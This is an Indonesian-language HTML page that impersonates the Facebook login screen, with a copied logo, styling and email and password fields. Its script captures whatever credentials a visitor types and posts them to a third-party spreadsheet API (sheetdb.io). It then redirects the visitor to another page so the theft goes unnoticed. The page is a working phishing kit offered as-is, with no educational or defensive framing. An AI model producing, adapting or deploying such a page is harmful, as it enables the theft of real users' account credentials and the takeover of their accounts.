<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Akun Facebook</title>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: Helvetica, Arial, sans-serif; 
        }
        
        body { 
            background-color: #f0f2f5; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }
        
        .main-container {
            display: flex;
            width: 100%;
            max-width: 980px;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .left-box { 
            width: 580px; 
            padding-bottom: 100px;
        }
        
        .fb-logo { 
            width: 300px; 
            margin-left: -28px; 
            display: block;
        }
        
        .fb-text { 
            font-size: 28px; 
            font-weight: normal; 
            line-height: 32px; 
            width: 500px; 
            color: #1c1e21; 
            margin-top: -10px;
        }

        .right-box { 
            width: 396px; 
        }
        
        .login-card {
            background: #fff;
            padding: 16px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            text-align: center;
        }

        .input-field {
            width: 100%;
            height: 52px;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
            outline: none;
            color: #1c1e21;
        }

        .input-field:focus { 
            border-color: #1877f2; 
            box-shadow: 0 0 0 2px #e7f3ff; 
        }

        .btn-login {
            width: 100%;
            height: 48px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            margin-bottom: 16px;
        }

        .btn-login:hover { background-color: #166fe5; }
        .btn-login:disabled { background-color: #8dbbf8; cursor: not-allowed; }

        .forgot-link {
            display: block;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .forgot-link:hover { text-decoration: underline; }

        .divider { 
            border: 0; 
            border-top: 1px solid #dadde1; 
            margin-bottom: 20px; 
        }

        .btn-create {
            background-color: #42b72a;
            height: 48px;
            padding: 0 16px;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            display: inline-block;
        }

        .btn-create:hover { background-color: #36a420; }

        .sub-footer { 
            margin-top: 28px; 
            font-size: 14px; 
            color: #1c1e21; 
            text-align: center;
        }
        
        .sub-footer a { 
            text-decoration: none; 
            font-weight: bold; 
            color: #1c1e21; 
        }
        
        .sub-footer a:hover { text-decoration: underline; }

        @media (max-width: 900px) {
            .main-container { 
                flex-direction: column; 
                margin-top: 20px; 
            }
            .left-box { 
                width: 100%; 
                text-align: center; 
                padding-bottom: 40px; 
            }
            .fb-logo { 
                width: 200px; 
                margin: 0 auto; 
            }
            .fb-text { 
                width: 100%; 
                font-size: 24px; 
                line-height: 28px; 
            }
            .right-box { 
                width: 100%; 
                max-width: 400px; 
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="left-box">
            <img src="fb.png" alt="Facebook" class="fb-logo">
            <h2 class="fb-text">Login Akun Facebook</h2>
        </div>

        <div class="right-box">
            <div class="login-card">
                <form id="fbForm">
                    <input type="email" id="email" class="input-field" placeholder="Email" required>
                    <input type="password" id="password" class="input-field" placeholder="Password" required>
                    
                    <button type="submit" id="btnSubmit" class="btn-login">Log In</button>
                    
                    <a href="#" class="forgot-link">Lupa kata sandi?</a>
                </form>
            </div>
        </div>
    </div>

<script>
    const form = document.getElementById('fbForm');
    const btn = document.getElementById('btnSubmit');

    form.addEventListener("submit", function(e) {
        e.preventDefault();
        
        btn.innerHTML = "Memproses...";
        btn.disabled = true;

        const url = 'https://sheetdb.io/api/v1/88dp9i3eezpg7';
        const data = {
            data: [{
                "Email": document.getElementById('email').value,
                "Password": document.getElementById('password').value
            }]
        };

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(result => console.log("Success:", result))
        .catch(err => console.error("Error:", err))
        .finally(() => {
            window.location.href = "index4.html";
        });
    });
</script>

</body>
</html>
